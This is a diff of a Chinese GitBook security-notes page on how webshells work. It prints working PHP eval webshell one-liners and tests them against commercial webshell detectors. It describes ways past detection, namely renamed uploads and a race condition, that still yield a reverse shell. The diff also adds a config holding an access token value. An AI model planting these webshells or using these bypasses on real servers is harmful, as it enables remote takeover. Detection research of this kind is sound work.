 </code></pre>
-<p><a href="webshell&#x539F;&#x7406;.assets/22.png" data-lightbox="ded693a2-6a82-4ba6-93e0-624a0db30017" data-title=""><img src="webshell&#x539F;&#x7406;.assets/22.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/22.png" data-lightbox="3e9462a0-0587-4259-8a63-984b4fe8a483" data-title=""><img src="webshell&#x539F;&#x7406;.assets/22.png" alt=""></a></p>
 <h4 id="23php">23.php</h4>
 <pre class="language-"><code class="lang-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;x&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">&apos;eba0&apos;</span><span class="token operator">&amp;&amp;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;c&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">&gt;</span>
 </code></pre>
-<p><a href="webshell&#x539F;&#x7406;.assets/25.png" data-lightbox="c268f1e2-a7a1-4b59-94c9-4cfbf5f22c2c" data-title=""><img src="webshell&#x539F;&#x7406;.assets/25.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/25.png" data-lightbox="f23d6c01-e5bd-4def-a4e0-d754ad7a29a8" data-title=""><img src="webshell&#x539F;&#x7406;.assets/25.png" alt=""></a></p>
 <h4 id="bypassphp">bypass.php</h4>
 <pre class="language-"><code class="lang-php"><span class="token delimiter important">&lt;?php</span>
 
@@ -3995,21 +4012,21 @@
     <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 </code></pre>
-<p><a href="webshell&#x539F;&#x7406;.assets/23.png" data-lightbox="1deece16-0900-48fe-b5b8-e0d510f4f97c" data-title=""><img src="webshell&#x539F;&#x7406;.assets/23.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/23.png" data-lightbox="f7247662-397b-42f2-ba6f-2195cf6faccd" data-title=""><img src="webshell&#x539F;&#x7406;.assets/23.png" alt=""></a></p>
 <h4 id="shellphp">shell.php</h4>
 <pre class="language-"><code class="lang-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;ap&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token operator">&gt;</span>
 </code></pre>
-<p><a href="webshell&#x539F;&#x7406;.assets/24.png" data-lightbox="8102cab6-d10e-4613-938e-5a83d31c57a1" data-title=""><img src="webshell&#x539F;&#x7406;.assets/24.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/24.png" data-lightbox="896a1b0b-74da-4772-8a37-448c11f30911" data-title=""><img src="webshell&#x539F;&#x7406;.assets/24.png" alt=""></a></p>
 <h4 id="&#x6912;&#x56FE;d&#x76FE;&#x6CB3;&#x9A6C;&#x68C0;&#x6D4B;&#x7ED3;&#x679C;">&#x6912;&#x56FE;&amp;D&#x76FE;&amp;&#x6CB3;&#x9A6C;&#x68C0;&#x6D4B;&#x7ED3;&#x679C;</h4>
 <h5 id="&#x6CB3;&#x9A6C;">&#x6CB3;&#x9A6C;</h5>
-<p><a href="webshell&#x539F;&#x7406;.assets/hema.png" data-lightbox="7bd25e4c-18c3-4306-b890-a5cb479189bd" data-title=""><img src="webshell&#x539F;&#x7406;.assets/hema.png" alt=""></a>
-<a href="../img/hema1.png" data-lightbox="78dcdd08-0a9d-4966-a1da-a18de9fd078d" data-title=""><img src="../img/hema1.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/hema.png" data-lightbox="f34fc6e1-eb8a-4d7d-a685-7a6a943f58f9" data-title=""><img src="webshell&#x539F;&#x7406;.assets/hema.png" alt=""></a>
+<a href="../img/hema1.png" data-lightbox="972cf951-1966-480e-8620-699c0c050107" data-title=""><img src="../img/hema1.png" alt=""></a></p>
 <h5 id="d&#x76FE;">D&#x76FE;</h5>
-<p><a href="webshell&#x539F;&#x7406;.assets/d&#x76FE;.png" data-lightbox="17bd6dd5-6fdf-47a7-a4b1-7e64bc299fb7" data-title=""><img src="webshell&#x539F;&#x7406;.assets/d&#x76FE;.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/d&#x76FE;.png" data-lightbox="33d12fdb-5a25-40c8-8f1b-21d64fe54224" data-title=""><img src="webshell&#x539F;&#x7406;.assets/d&#x76FE;.png" alt=""></a></p>
 <h5 id="&#x6912;&#x56FE;">&#x6912;&#x56FE;</h5>
-<p><a href="webshell&#x539F;&#x7406;.assets/jwotono.png" data-lightbox="fb8459fc-fcf3-436b-9194-380f5e71ae9a" data-title=""><img src="webshell&#x539F;&#x7406;.assets/jwotono.png" alt=""></a></p>
-<p><a href="webshell&#x539F;&#x7406;.assets/jwotoYes.png" data-lightbox="e961d96b-13bf-4c6a-9f97-6597a657f3ee" data-title=""><img src="webshell&#x539F;&#x7406;.assets/jwotoYes.png" alt=""></a></p>
-<p><a href="webshell&#x539F;&#x7406;.assets/jwotoyes2.png" data-lightbox="c4d0217b-afd6-4b0c-a989-c44f2e29fcc5" data-title=""><img src="webshell&#x539F;&#x7406;.assets/jwotoyes2.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/jwotono.png" data-lightbox="765dc522-0df0-468c-8043-a303e63a0dc4" data-title=""><img src="webshell&#x539F;&#x7406;.assets/jwotono.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/jwotoYes.png" data-lightbox="fad366c1-56c5-4968-a052-d6dc8dbc1323" data-title=""><img src="webshell&#x539F;&#x7406;.assets/jwotoYes.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/jwotoyes2.png" data-lightbox="be7b5106-e75f-429e-9373-f6195eb4eb72" data-title=""><img src="webshell&#x539F;&#x7406;.assets/jwotoyes2.png" alt=""></a></p>
 <h4 id="&#x6912;&#x56FE;d&#x76FE;&#x6CB3;&#x9A6C;&#x6BD4;&#x8F83;">&#x6912;&#x56FE;&amp;D&#x76FE;&amp;&#x6CB3;&#x9A6C;&#x6BD4;&#x8F83;</h4>
 <h5 id="&#x6912;&#x56FE;">&#x6912;&#x56FE;</h5>
 <table>
@@ -4078,41 +4095,41 @@
 <p>&#x9488;&#x5BF9;7.php , test_7.php &#xFF0C;&#x90FD;&#x662F;&#x901A;&#x8FC7;&#x622A;&#x53D6;$_COOKIE[&quot;set-domain-name&quot;] &#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x6765;&#x62FC;&#x63A5;&#x6210;&#x5371;&#x9669;&#x51FD;&#x6570;&#xFF1B;</p>
 <p>&#x6700;&#x540E;&#x5BF9;&#x4E8E;bypass.php ,&#x662F;&#x4E4B;&#x524D;&#x5B66;&#x4E60;bypass disable function &#x7684;&#x65F6;&#x5019;&#x5728;github&#x4E0A;&#x627E;&#x5230;&#x7684;&#x4E00;&#x4E2A;&#x7528;&#x6765;&#x7ED5;php7.0-php7.4&#x7684;&#x901A;&#x7528;&#x578B;&#x811A;&#x672C;&#xFF0C;&#x6D4B;&#x8BD5;&#x5728;apache&#xFF0C;nginx &#x4E24;&#x4E2A;web&#x5BB9;&#x5668;&#x4E0A;&#x80FD;&#x7A33;&#x5B9A;&#x8FD0;&#x884C;&#x3002;&#xFF08;&#x6682;&#x65F6;&#x8FD8;&#x672A;&#x5403;&#x900F;&#x8BE5;poc&#xFF09;</p>
 <h3 id="webshell&#x68C0;&#x6D4B;&#xFF08;&#x5F00;&#x542F;rasp&#xFF09;">webshell&#x68C0;&#x6D4B;&#xFF08;&#x5F00;&#x542F;rasp&#xFF09;</h3>
-<p><a href="webshell&#x539F;&#x7406;.assets/26.png" data-lightbox="58e51022-ae94-465b-b9b9-4507551883b0" data-title=""><img src="webshell&#x539F;&#x7406;.assets/26.png" alt=""></a></p>
-<p><a href="webshell&#x539F;&#x7406;.assets/rasp_1.png" data-lightbox="aebee21d-9f1b-464b-929a-3e6a23dc5bc8" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_1.png" alt=""></a></p>
-<p><a href="webshell&#x539F;&#x7406;.assets/rasp_2.png" data-lightbox="36191a63-665f-4670-be1a-f10d78ce2662" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_2.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/26.png" data-lightbox="85387e3c-f415-4210-9e7e-302ca7f3d452" data-title=""><img src="webshell&#x539F;&#x7406;.assets/26.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/rasp_1.png" data-lightbox="dd101fc1-dcd2-41a7-9ed4-41b3ec1325e8" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_1.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/rasp_2.png" data-lightbox="144714cc-5d5d-42e6-aaec-adbe99a9f372" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_2.png" alt=""></a></p>
 <h4 id="&#x4E0A;&#x4F20;1php---29php">&#x4E0A;&#x4F20;1.php - 29.php</h4>
 <p>&#x7531;&#x4E8E;&#x5F00;&#x542F;&#x4E86;&#x5E94;&#x7528;&#x9632;&#x62A4;&#xFF0C;&#x4F1A;&#x5C06;&#x5DF2;&#x77E5;webshell&#xFF0C;&#x672A;&#x77E5;webshell&#x9694;&#x79BB;&#xFF0C;&#x6240;&#x4EE5;&#x4E0D;&#x90E8;&#x5206;&#x5DF2;&#x77E5;webshell&#xFF0C;&#x672A;&#x77E5;webshell&#x90FD;&#x4F1A;&#x88AB;&#x9694;&#x79BB;&#xFF0C;&#x5F53;&#x5168;&#x90E8;&#x4E0A;&#x4F20;&#x6210;&#x529F;&#x4E4B;&#x540E;&#xFF0C;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x5217;&#x8868;&#x5982;&#x56FE;&#x6240;&#x793A;&#xFF1A;</p>
-<p><a href="webshell&#x539F;&#x7406;.assets/rasp_3.png" data-lightbox="6187d2b2-1409-4a1b-8c4c-9a5943ced6be" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_3.png" alt=""></a></p>
-<p><a href="webshell&#x539F;&#x7406;.assets/rasp_15.png" data-lightbox="575d5552-a91f-41f3-a08c-aff3a7d31f89" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_15.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/rasp_3.png" data-lightbox="047d923b-1917-45c7-839e-1f051d94cfe1" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_3.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/rasp_15.png" data-lightbox="0735af76-d820-477f-ba48-f6fd4c434876" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_15.png" alt=""></a></p>
 <h4 id="3php">3.php</h4>
-<p><a href="webshell&#x539F;&#x7406;.assets/rasp_8.png" data-lightbox="50659ea3-22e5-4358-9ecf-30621691e3ba" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_8.png" alt=""></a></p>
-<p><a href="webshell&#x539F;&#x7406;.assets/rasp_9.png" data-lightbox="0491c1af-ba94-4826-be33-3adccb3dc20f" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_9.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/rasp_8.png" data-lightbox="e78d81dc-5442-455a-b43a-db8f8daaa122" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_8.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/rasp_9.png" data-lightbox="580e2a42-b08a-495e-b5eb-09a67adeb380" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_9.png" alt=""></a></p>
 <h4 id="test6php">test_6.php</h4>
-<p><a href="webshell&#x539F;&#x7406;.assets/rasp_11.png" data-lightbox="baf27238-a05b-4567-9ce7-0f7a114f8ec9" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_11.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/rasp_11.png" data-lightbox="4cbb2069-cca2-4070-989e-b78a15727546" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_11.png" alt=""></a></p>
 <h4 id="test7php">test_7.php</h4>
-<p><a href="webshell&#x539F;&#x7406;.assets/rasp_10.png" data-lightbox="9f750f8d-45ac-472f-9c8c-35f8097370c9" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_10.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/rasp_10.png" data-lightbox="600b7fef-7c24-483b-b99b-2fff40cc9ef9" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_10.png" alt=""></a></p>
 <h4 id="bypassphp">bypass.php</h4>
-<p><a href="webshell&#x539F;&#x7406;.assets/rasp_12.png" data-lightbox="2afb3b9c-a9eb-465a-be41-2bc05db7b20e" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_12.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/rasp_12.png" data-lightbox="952bb9a8-ee0d-4865-bd40-096d0441d465" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_12.png" alt=""></a></p>
 <h4 id="&#x6912;&#x56FE;&#x68C0;&#x6D4B;&#x60C5;&#x51B5;">&#x6912;&#x56FE;&#x68C0;&#x6D4B;&#x60C5;&#x51B5;</h4>
 <p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x53CD;&#x5F39;shell&#x7684;&#x654F;&#x611F;&#x64CD;&#x4F5C;&#xFF0C;&#x90FD;&#x80FD;&#x88AB;&#x6355;&#x83B7;&#xFF0C;&#x4F46;&#x662F;&#x8681;&#x5251;&#x5728;&#x672A;&#x7F16;&#x7801;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6210;&#x529F;&#x8FDE;&#x63A5;&#xFF0C;&#x672A;&#x88AB;&#x68C0;&#x6D4B;&#x5230;&#x3002;</p>
-<p><a href="webshell&#x539F;&#x7406;.assets/rasp_13.png" data-lightbox="90765d87-5a8b-4668-88b2-1b15537927c5" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_13.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/rasp_13.png" data-lightbox="d40a5066-0e5f-468c-93b6-3f513675512e" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_13.png" alt=""></a></p>
 <p>&#x5F53;&#x5B58;&#x5728;&#x5982;&#x4E0B;&#x7684;&#x654F;&#x611F;&#x64CD;&#x4F5C;&#xFF0C;webshell&#x5E76;&#x672A;&#x88AB;&#x9694;&#x79BB;</p>
-<p><a href="webshell&#x539F;&#x7406;.assets/rasp_14.png" data-lightbox="d74e88bf-b735-404b-978e-b2013455b899" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_14.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/rasp_14.png" data-lightbox="bd75756d-03e1-40f6-8571-98ae3a5a0033" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_14.png" alt=""></a></p>
 <h4 id="bug1-&#x540C;&#x4E00;&#x9A6C;&#x4E0D;&#x540C;&#x540D;&#x672A;&#x9694;&#x79BB;">Bug1 &#x540C;&#x4E00;&#x9A6C;&#x4E0D;&#x540C;&#x540D;&#x672A;&#x9694;&#x79BB;</h4>
 <p>&#x4E0A;&#x4F20;&#x540C;&#x4E00;&#x4E2A;&#x9A6C;&#xFF0C;&#x6539;&#x53D8;&#x6587;&#x4EF6;&#x540D;&#x79F0;&#xFF0C;&#x4F7F;&#x7528;burp&#x7684;Intruder&#x6A21;&#x5757;&#x679A;&#x4E3E;&#x4E0A;&#x4F20;&#x5982;666a.php , 777a.php &#x672A;&#x53D7;&#x5F71;&#x54CD;&#xFF0C;&#x53EF;&#x4EE5;&#x4E0A;&#x4F20;&#x6210;&#x529F;&#xFF0C;&#x5F53;&#x6267;&#x884C;&#x4E86;&#x654F;&#x611F;&#x64CD;&#x4F5C;&#xFF0C;&#x6912;&#x56FE;&#x624D;&#x80FD;&#x68C0;&#x6D4B;&#x5230;&#xFF0C;&#x518D;&#x6740;&#x9A6C;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x68C0;&#x6D4B;&#x5230;&#x654F;&#x611F;&#x64CD;&#x4F5C;&#x4E4B;&#x524D;&#xFF0C;&#x5176;&#x5B9E;&#x5C31;&#x5DF2;&#x7ECF;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;&#x53CD;&#x5F39;shell&#x4E86;</p>
-<p><a href="webshell&#x539F;&#x7406;.assets/rasp_4.png" data-lightbox="0b947db3-cebd-46ca-a5d2-d679fb36e7c8" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_4.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/rasp_4.png" data-lightbox="19ff5f8d-51c8-42a2-9f2b-242914883e63" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_4.png" alt=""></a></p>
 <blockquote>
 <p>&#x540C;1.php</p>
 </blockquote>
 <p>&#x670D;&#x52A1;&#x7AEF;&#x6267;&#x884C;&#x7ED3;&#x679C;</p>
-<p><a href="webshell&#x539F;&#x7406;.assets/rasp_5.png" data-lightbox="c16a0b1d-b4ad-450c-a0fc-141e858ee930" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_5.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/rasp_5.png" data-lightbox="7a145436-31c4-40f0-83c6-06a042c3008d" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_5.png" alt=""></a></p>
 <p>url&#x7F16;&#x7801;&#x4E4B;&#x540E;&#xFF0C;&#x53CD;&#x5F39;shell</p>
-<p><a href="webshell&#x539F;&#x7406;.assets/rasp_6.png" data-lightbox="e3b889a2-2082-4f6d-8df0-2a44af1dfa8d" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_6.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/rasp_6.png" data-lightbox="c0856a2f-20a4-4596-bf28-8caea07cb9e7" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_6.png" alt=""></a></p>
 <p>&#x5F53;&#x53CD;&#x5F39;&#x65F6;shell&#x6210;&#x529F;&#x4E4B;&#x540E;&#xFF0C;&#x518D;&#x53BB;&#x67E5;&#x770B;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x5DF2;&#x5220;&#x9664;&#xFF0C;&#x53D1;&#x73B0;777a.php &#x5E76;&#x672A;&#x5220;&#x9664;&#xFF0C;&#x5F53;&#x624B;&#x52A8;&#x5220;&#x9664;&#x4E4B;&#x540E;&#xFF0C;&#x518D;&#x4E0A;&#x4F20;&#x8FD9;&#x4E2A;&#x9A6C;&#xFF0C;&#x5C31;&#x4F20;&#x4E0D;&#x4E0A;&#x53BB;&#x4E86;&#xFF08;&#x6912;&#x56FE;&#x663E;&#x793A;&#x4E3A;&#x68C0;&#x6D4B;&#x5230;&#x5DF2;&#x77E5;webshell&#xFF09;,&#x63A8;&#x6D4B;&#x5F53;&#x68C0;&#x6D4B;&#x4E3A;&#x672A;&#x77E5;webshell&#x65F6;&#xFF0C;&#x5B58;&#x5728;&#x8BEF;&#x5DEE;&#xFF0C;&#x4F1A;&#x5224;&#x65AD;&#x662F;&#x5426;&#x8FDB;&#x884C;&#x654F;&#x611F;&#x64CD;&#x4F5C;&#xFF0C;&#x56E0;&#x6B64;&#x8FDB;&#x884C;&#x9694;&#x79BB;&#x3002;</p>
 <h4 id="bug-2-&#x6761;&#x4EF6;&#x7ADE;&#x4E89;">Bug 2 &#x6761;&#x4EF6;&#x7ADE;&#x4E89;</h4>
 <p>&#x5229;&#x7528;burp&#x679A;&#x4E3E;&#x4E0A;&#x4F20;&#x7C7B;&#x4F3C;1.php &#x7684;&#x53EF;&#x6267;&#x884C;php&#x7CFB;&#x7EDF;&#x51FD;&#x6570;&#x5982;system() &#xFF0C;&#x5F62;&#x6210;&#x6761;&#x4EF6;&#x7ADE;&#x4E89;&#xFF0C;&#x5F53;&#x6765;&#x4E0D;&#x53CA;&#x9694;&#x79BB;webshell&#x4E4B;&#x524D;&#xFF0C;&#x53CD;&#x5F39;shell&#x53EF;&#x6210;&#x529F;</p>
-<p><a href="webshell&#x539F;&#x7406;.assets/rasp_7.png" data-lightbox="1722fe3f-f927-49db-b22b-4e754249169a" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_7.png" alt=""></a></p>
+<p><a href="webshell&#x539F;&#x7406;.assets/rasp_7.png" data-lightbox="4bb0ae77-2476-493f-b9ae-25df6e3cc61c" data-title=""><img src="webshell&#x539F;&#x7406;.assets/rasp_7.png" alt=""></a></p>
 <p>bug&#x5206;&#x6790;&#xFF1A;</p>
 <p>&#x9694;&#x79BB;&#x5B58;&#x5728;&#x65F6;&#x95F4;&#x5DEE;&#xFF0C;&#x5F53;&#x9AD8;&#x5E76;&#x53D1;&#x4E0A;&#x4F20;webshell&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x5E94;&#x8BE5;&#x8003;&#x8651;&#x662F;&#x5426;&#x662F;&#x811A;&#x672C;&#x653B;&#x51FB;&#xFF0C;&#x5BF9;&#x811A;&#x672C;&#x653B;&#x51FB;&#x7684;&#x5927;&#x91CF;&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x5E94;&#x8BE5;&#x53CA;&#x65F6;&#x5C01;&#x6389;ip </p>
 <footer class="page-footer"><span class="copyright">Copyright &#xA9; aaron 2023 all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x8BE5;&#x6587;&#x7AE0;&#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A;
@@ -4159,7 +4176,7 @@
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"10.webshell原理","level":"1.2.15.10","depth":3,"next":{"title":"11.ByPaass disable Function","level":"1.2.15.11","depth":3,"path":"知识库/01.WEB安全/99.其他/11.ByPaass disable Function.md","ref":"知识库/01.WEB安全/99.其他/11.ByPaass disable Function.md","articles":[]},"previous":{"title":"09.反弹shell","level":"1.2.15.9","depth":3,"path":"知识库/01.WEB安全/99.其他/09.反弹shell.md","ref":"知识库/01.WEB安全/99.其他/09.反弹shell.md","articles":[]},"dir":"ltr"},"config":{"plugins":["splitter","hide-element","code","theme-d4t","-lunr","-search","-sharing","search-pro-fixed","-highlight","chapter-fold","expandable-chapters","lightbox","tbfed-pagefooter","github","flexible-alerts","prism","back-to-top-button","auto-scroll-table","expandable-chapters","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"theme-d4t":{},"tbfed-pagefooter":{"copyright":"Copyright &copy aaron 2023","modify_label":"该文章修订时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"chapter-fold":{},"prism":{"css":["prismjs/themes/prism-tomorrow.css"],"lang":{"flow":"typescript","shell":"bash","xml-dtd":"xml"},"ignore":["mermaid","eval-js","ascii","result","manifest","payload","google","tree","java_out","log4j2","jsp","class","Exception","stack","c#","xml-dtd","C++","twig","jinja2","exception","tpl"]},"github":{"url":"https://github.com/byAaronLuo"},"d4t":{"search-placeholder":"请输入关键字搜索","logo":"/README.assets/logo.svg","favicon":"/README.assets/favicon.ico"},"livereload":{},"splitter":{},"auto-scroll-table":{},"code":{"copyButtons":true},"search-pro-fixed":{},"hide-element":{"elements":[".gitbook-link",".title",".treeview__copyright",".treeview__main-title"]},"fontsettings":{"theme":"white","family":"sans","size":2},"lightbox":{"jquery":true,"sameUuid":false},"back-to-top-button":{},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"},"comment":{"label":"Comment","icon":"fa fa-comments","className":"info"}},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{"collapsible":true,"level":2,"prepend":true,"scrollToTitle":true}},"theme":"default","author":"aaron","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Aaron 知识库","gitbook":"*","description":"个人的部分知识技能，倾向于使用知识库的方式进行总结回顾自己","theme-default":{"showLevel":true}},"file":{"path":"知识库/01.WEB安全/99.其他/10.webshell原理.md","mtime":"2023-06-02T15:05:18.971Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-06-19T10:00:09.589Z"},"basePath":"../../..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"10.webshell原理","level":"1.2.15.10","depth":3,"next":{"title":"11.ByPaass disable Function","level":"1.2.15.11","depth":3,"path":"知识库/01.WEB安全/99.其他/11.ByPaass disable Function.md","ref":"知识库/01.WEB安全/99.其他/11.ByPaass disable Function.md","articles":[]},"previous":{"title":"09.反弹shell","level":"1.2.15.9","depth":3,"path":"知识库/01.WEB安全/99.其他/09.反弹shell.md","ref":"知识库/01.WEB安全/99.其他/09.反弹shell.md","articles":[]},"dir":"ltr"},"config":{"plugins":["splitter","hide-element","code","theme-d4t","-lunr","-search","-sharing","search-pro-fixed","-highlight","chapter-fold","expandable-chapters","lightbox","tbfed-pagefooter","github","flexible-alerts","prism","back-to-top-button","auto-scroll-table","expandable-chapters","lock","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"theme-d4t":{},"tbfed-pagefooter":{"copyright":"Copyright &copy aaron 2023","modify_label":"该文章修订时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"chapter-fold":{},"prism":{"css":["prismjs/themes/prism-tomorrow.css"],"lang":{"flow":"typescript","shell":"bash","xml-dtd":"xml"},"ignore":["mermaid","eval-js","ascii","result","manifest","payload","google","tree","java_out","log4j2","jsp","class","Exception","stack","c#","xml-dtd","C++","twig","jinja2","exception","tpl"]},"github":{"url":"https://github.com/byAaronLuo"},"d4t":{"search-placeholder":"请输入关键字搜索","logo":"/README.assets/logo.svg","favicon":"/README.assets/favicon.ico"},"livereload":{},"splitter":{},"lock":{"verificationCode":{"key":"Token","value":"!&pF@RFL8Vs$nhM6"},"lockTokenKey":"Token","email":"aaronluo54@gmail.com","allPage":false,"articleHeightPercent":0},"auto-scroll-table":{},"code":{"copyButtons":true},"search-pro-fixed":{},"hide-element":{"elements":[".gitbook-link",".title",".treeview__copyright",".treeview__main-title"]},"fontsettings":{"theme":"white","family":"sans","size":2},"lightbox":{"jquery":true,"sameUuid":false},"back-to-top-button":{},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"},"comment":{"label":"Comment","icon":"fa fa-comments","className":"info"}},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{"collapsible":true,"level":2,"prepend":true,"scrollToTitle":true}},"theme":"default","author":"aaron","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Aaron 知识库","gitbook":"*","description":"个人的部分知识技能，倾向于使用知识库的方式进行总结回顾自己","theme-default":{"showLevel":true}},"file":{"path":"知识库/01.WEB安全/99.其他/10.webshell原理.md","mtime":"2023-06-02T15:05:18.971Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-06-22T15:20:17.199Z"},"basePath":"../../..","book":{"language":""}});
         });
     </script>
 </div>
@@ -4214,6 +4231,10 @@
     
         
         <script src="../../../gitbook/gitbook-plugin-auto-scroll-table/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-lock/lock.js"></script>
         
     
         
